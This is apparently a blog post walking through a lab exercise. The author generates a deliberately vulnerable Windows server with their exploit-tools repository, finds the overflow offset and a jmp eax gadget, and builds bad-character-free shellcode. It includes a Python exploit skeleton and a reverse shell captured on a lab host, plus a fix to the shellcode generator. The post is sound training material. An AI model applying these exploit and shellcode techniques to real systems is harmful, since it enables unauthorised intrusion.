---
layout: post
title:  "From a Seed to a Shell"
date:   2026-09-10 09:00:00 +0100
categories: security, exploit-dev
type:   article
description: "Generating a vulnerable Windows server from a seed and walking it all the way to a reverse shell, using the four tools in exploit-tools and fixing the one that got it wrong."
---

There are two annoying things about practising exploit development. We run out of targets,
and the second time you exploit one of the well known ones you are not really exploiting
it any more, you are remembering it. The tooling for the rest of the loop is also
scattered, a gadget parser here, a shellcode generator there, and a folder of half
remembered Python snippets.

[exploit-tools](https://github.com/desterhuizen/exploit-tools) is my attempt at both in one
repository. Lets generate a target none of us have seen and take it all the way to a shell.

## Generate a target from a seed

`target_builder` generates compilable C++ Windows servers with the vulnerability you asked
for, or with one it picks for you.

```bash
target_builder_cli --arch x86 --vuln bof --output main.cpp --exploit crash \
  --build-script --compiler mingw --random --random-seed 1810241843

# random picks the challenge parameters for us
# random-seed makes that choice reproducible
# build-script writes the mingw command line out to main.sh
```

```
[*] Random seed: 1810241843

==================================================
  CHALLENGE PARAMETERS
==================================================
  Vulnerability:  bof
  Architecture:   x86
  Protocol:       tcp
  Buffer size:    1024
  Stack layout:   padding=32B (array), landing_pad=16B, (short jump likely needed)
  Bad chars:      0x00, 0x0a, 0x0d, 0x20, 0x25, 0x26, 0x2b
  Bad char mode:  drop
  Mitigations:    Verification (2 checks, basic)
  Base address:   0x77680000
  Decoys:         3
  Seed:           1810241843
  Verify seed:    103415240
==================================================

[+] Server source: main.cpp
[+] Build script: main.sh
[+] Exploit skeleton: exploit.py
```

That gives us 329 lines of C++, a build script and a client skeleton. The seed is the
important part, the same seed and the same version of the tool give us the same binary on
any machine, so I can hand someone a one line command instead of a binary. Read the
verification bytes out of your own generated source though, those come from a separately
derived seed.

## Build it and check what we are up against

```bash
i686-w64-mingw32-g++ -fno-stack-protector main.cpp -o main.exe -lws2_32 -static \
  -Wl,--disable-nxcompat -Wl,--disable-dynamicbase -Wl,--image-base,0x77680000
```

No stack cookie, no DEP and no ASLR. `get_base_address.py` reads the PE back and confirms
where it landed.

```bash
get_base_address.py main.exe -v

=== PE File Information ===
File: main.exe
ImageBase: 0x77680000
Decimal: 2003304448
Entry Point (RVA): 0x1460
Entry Point (Absolute): 0x77681460
Machine Type: x86 (I386)
Subsystem: WINDOWS_CUI
```

Neither `0x77680000` nor the `0x11110000` default is the `0x00400000` a standard Windows
EXE gets, and that is deliberate. A standard base means every code address starts with a
null byte, and since the vulnerability is `strcpy` a null byte terminates the copy. Every
return address we might want would be unusable.

## Talk to the server before reading any source

The binary goes onto a Windows 10 host on the lab network. Before opening `main.cpp` this
is the whole conversation.

```
banner: FileSync Pro v3.2.1 - Enterprise File Server

HELP        -> Available commands:
                 TRAD
                 HELP
                 STATS
                 EXIT
STATS       -> Server Statistics:
                 Uptime: 47120 seconds
                 Status: Running
FOO         -> Unknown command. Type HELP for available commands.
TRAD        -> TRAD: missing argument
TRAD AAAA   -> Access denied.
```

`HELP` lists four commands and the server actually implements seven. The three it does not
mention are the decoys that `--decoy-commands` added, and we only find them by guessing
verbs or by reading the binary.

## Try the decoys

The decoys look exploitable and are not. A `strncpy` with correct bounds, a `_snprintf`
that uses a format specifier properly, and a `strcpy` into a heap buffer. We send 600
bytes to each.

```
EXECUTE AAAA...   -> EXECUTE: OK
TRANSFER AAAA...  -> TRANSFER: OK
PROCESS AAAA...   -> connection reset
```

`PROCESS` is the good one. It is the only handler that visibly breaks, it takes the whole
server process down, and it gives us nothing, because the overflow lands in a 256 byte
heap allocation that gets corrupted and then freed. That is an afternoon gone if we chase
it.

## Reverse the gate

`TRAD AAAA` came back with `Access denied.` rather than reaching the bug. That is the
`--verification` feature, which compiles a `verify_input()` into the server that our
payload has to satisfy first. Five instructions give up all three conditions.

```
776816dc <verify_input>:
776816df:   cmpl  $0x17, 0xc(%ebp)      ; length must be > 23
776816ef:   addl  $0x17, %eax
776816f5:   cmpb  $0x37, %al            ; byte 23 must not be 0x37
77681703:   addl  $0x2, %eax
77681709:   cmpb  $0x3b, %al            ; byte 2 must be 0x3B
```

So the first 24 bytes of every payload are a header we do not get to choose freely. Get it
wrong and the server says `Access denied.`, get it right and it says nothing at all, and
that silence is the first useful signal we get.

## Understand the filter before measuring anything

This is the part that will cost us an hour if we skip it. `filter_bad_chars` runs before
the copy and in drop mode it removes the seven bad bytes and compacts everything left
towards the start of the buffer.

That means our offset is only stable if the payload contains no filtered bytes at all. The
generated `exploit.py` skeleton gets this wrong in a useful way, its 24 byte header is 22
NUL bytes, all of which get dropped, so the header collapses to 2 bytes and everything
after it slides 22 places to the left.

## Find where control transfers

We send a 24 byte header of `A` with byte 2 set to `0x3B`, then 1200 bytes of cyclic
pattern. Nothing in that payload is a filtered byte, so nothing shifts. The disassembly of
`vuln_function` tells us where it should land before we send it.

```
7768171b <vuln_function>:
7768171e:   subl  $0x448, %esp          ; 1096 byte frame
77681731:   calll <filter_bad_chars>
77681746:   leal  -0x2c(%ebp), %eax     ; audit_trail[32]
7768176c:   movl  $0x438, -0xc(%ebp)    ; max_process_len = 1080
7768178d:   leal  -0x42c(%ebp), %eax    ; buffer, 1068 below EBP
77681796:   calll <_strcpy>
```

`buffer` sits at `ebp-0x42c`, putting the saved frame pointer at buffer+1068 and the saved
return address at buffer+1072. The server truncates at 1080, so we reach it with four
bytes to spare. Four, not the sixteen the skeleton's docstring advertises. Lets send it.

```
eax=008cd9b4 ebx=000000d0 ecx=008ce3a0 edx=326a0031 esi=7768179e edi=7768179e
eip=6a423969 esp=008cdde8 ebp=42386942 iopl=0
```

`6a423969` and `42386942` are the pattern bytes at offsets 1048 and 1044, which is 1072
and 1068 once we add the header back. Prediction and measurement agree, so the offset is
1072.

Here is the same moment from an earlier run with a plain run of `A`.

![EIP overwritten with 41414141 in WinDbg](/assets/eip-control.png)

## Find somewhere to jump

DEP is off so we do not need a ROP chain, just one address to return to, and the usual
answer is a `jmp esp`. `get_rop_gadgets.py` takes [rp++](https://github.com/0vercl0k/rp)
output and makes it searchable by instruction, register, regex, category, gadget length
and bad characters.

```powershell
.\rp-win-x86.exe -f .\main.exe -r 5 > rop.txt
```

```bash
get_rop_gadgets -f rop.txt -b "0x00,0x0a,0x0d,0x20,0x25,0x26,0x2b" -r "jmp esp"
[*] Parsing file: rop.txt
[*] Parsed 2852 gadgets

[*] Found 0 gadgets matching regex 'jmp esp'
```

Nothing, and no `call esp` or `push esp ; ret` either. A small statically linked MinGW
binary does not carry one and the system DLLs get rebased on every boot. Lets look at the
crash registers instead.

```
eax=008cd9b4   esp=008cdde8
esp - eax = 0x434 = 1076
```

The saved return address was at buffer+1072, so once it is popped ESP sits at buffer+1076,
and EAX is 1076 bytes below that. EAX is pointing at the first byte of our own data. That
is not luck, `strcpy` returns its destination pointer, `vuln_function` calls it last, and
`leave` does not touch EAX.

So we want a `jmp eax`.

```bash
get_rop_gadgets -f rop.txt -b "0x00,0x0a,0x0d,0x20,0x25,0x26,0x2b" \
  -r "^jmp eax" --keep-bad-instructions
[*] Found 2 gadgets matching regex '^jmp eax'

[*] Filtered to 2 gadgets without bad chars (removed 0)

=== Results (2 gadgets) ===

0x77682a95: jmp eax ;  (1 found)
0x776894ba: jmp eax ;  (1 found)
```

We need `--keep-bad-instructions` because the tool drops unconditional jumps by default,
assuming we are building a chain that a `jmp` would end. Here the jump is the whole
exploit.

## Generate a payload that survives the filter

`shellgen` generates position independent shellcode with bad character avoidance built in.
On Windows it walks the PEB to find `kernel32.dll` and resolves APIs by ROR13 hash, so
there are no readable strings in the payload.

```bash
shellgen --platform windows --payload winexec --cmd "calc.exe" --arch x86 \
  --bad-chars "00,0a,0d,20,25,26,2b" --format raw --output calc.bin
```

231 bytes, and not one of our seven bytes in it. The reverse shell we actually want is the
same command with a different payload name, and comes out at 400 bytes, also clean.

That is the behaviour today. It was not the behaviour when I started writing this post.

### The bug this walkthrough found

The first run produced 225 bytes with `0x20` in it twice, at offsets `0x19` and `0x3E`.
I had passed `0x20` on the command line. Both offsets land on a displacement inside the
hash resolver.

```asm
mov edi, [esi+0x20]     ; 8b 7e 20  module name in the loader walk
mov eax, [edi+0x20]     ; 8b 47 20  AddressOfNames in the export walk
```

`shellgen` honoured `--bad-chars` for pushed constants and ignored it everywhere else. The
PEB and export walk was a fixed string literal that never referenced the bad character set
at all, so any requested byte that happened to equal a structure offset was emitted anyway.
It was easy to miss because that template already dodges `0x00` in the stack allocation and
`0x0d` in the rotate constant by hand, which makes it look bad-char aware.

It was wider than `0x20`. Sweeping all 256 byte values one at a time, 100 of them came back
present in the payload we asked to avoid them in, on both architectures. Worse, on x64 the
default `00,0a,0d` alone was enough, because `mov reg, imm32` zero-pads, so every x64
payload carried NULL bytes and was unusable against any `strcpy` target. The tool exited 0
and wrote the file in every one of those cases.

The fix routes structure offsets through a helper that splits a colliding displacement
across a `lea` into a named scratch register, which is the same split-the-constant
technique as the repo's
[bad character avoidance reference](https://github.com/desterhuizen/exploit-tools/blob/main/docs/bad_character_avoidance.md).

```asm
lea eax, [esi+0x10]
mov edi, [eax+0x10]
```

Same effective address, six bytes instead of three. Frame slots the generator picks itself
relocate rather than split, and the API hashes, the stack reservation and the rotate count
are encoded now too.

The second half of the fix matters more than the first. Verification used to run after the
output was written, so even with `--verify` a corrupt payload reached disk before the
process exited 1, and the report it printed was checking a hardcoded list rather than the
bytes we asked about. Verification now runs before anything is written and refuses to write
at all.

| | before | after |
|---|---|---|
| byte values avoidable, x86 | 156 of 256 | 179 of 256 |
| byte values avoidable, x64 | 156 of 256 | 179 of 256 |
| silent leaks, exit 0 and file written | 100 | 0 |
| loud failures, nothing written | 0 | 77 |

The remaining 77 land in an opcode, a ModR/M field or a REX prefix, where no encoding
trick helps. Those now fail with a message saying so rather than handing us a broken
payload.

## Make the header executable

One thing left. EAX points at byte 0 of the buffer and byte 0 is the verification header,
so the header is not just data, it is the first instruction that runs. Two bytes solve it.

```
[0]      eb 16            jmp +0x16, over the rest of the header
[2]      3b               verify_input requires 0x3B here
[3..23]  41 * 21          filler, byte 23 is 0x41 and not the forbidden 0x37
[24..]   shellcode
[..1071] 41 filler
[1072]   95 2a 68 77      0x77682a95, jmp eax
```

```python
OFFSET  = 1072
JMP_EAX = 0x77682a95

stub  = b"\xeb\x16"     # jump over the gate header into the shellcode
stub += b"\x3b"         # verify_input: data[2] must be 0x3B
stub += b"A" * 21       # data[23] = 0x41, not the forbidden 0x37

payload  = stub + shellcode
payload += b"A" * (OFFSET - len(payload))
payload += struct.pack("<I", JMP_EAX)

assert not (set(payload) & BAD_CHARS)
```

## Get a shell

```
[*] banner: FileSync Pro v3.2.1 - Enterprise File Server
[*] sending 1076 bytes, EIP -> 0x77682a95
[+] payload sent

[+] CONNECTION FROM 192.168.178.16:58596
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Users\[redacted]\Desktop>
ipconfig | findstr IPv4
   IPv4 Address. . . . . . . . . . . : 192.168.178.16
```

Seed to shell. The generator picked the buffer size, the padding, the bad characters and
the gate, and none of them were known to us in advance.

## Why these tools live in one repository

Keeping the four together means a bad character is the same thing everywhere. The list we
give `target_builder`, the list we filter gadgets with and the list `shellgen` avoids are
one list in one format. There are 1,113 tests across the suite, 530 of them in the ROP
tooling, weighted towards the parts where a silent wrong answer costs us an afternoon.

Twenty-one of those tests did not exist a day ago, and none of the ones that did caught the
`0x20`. Every test asked whether the encoder rewrote the constants it was given, and the
bug was in the assembly nobody thought of as having constants in it. That is the honest
shape of a test suite, it covers the failures we already thought of. Using the thing found
this one. The whole thing is AGPL-3.0.

# Conclusion

The tooling is not really the point. Being able to generate a target we have never seen,
at a difficulty we choose, with a seed we can hand to someone else, is the point. It moves
the practice away from remembering specific binaries and back towards having a method.

The method held up here. We predicted the offset from the disassembly and confirmed it
with a cyclic pattern, the gate fell out of five instructions, and the one real surprise
was answered by reading the crash registers rather than by guessing.

Everything above is on [GitHub](https://github.com/desterhuizen/exploit-tools). It is
built for authorised testing, CTFs, training labs and research on systems you own or have
written permission to test. The servers `target_builder` produces are deliberately
vulnerable and belong on an isolated lab network and nowhere else.
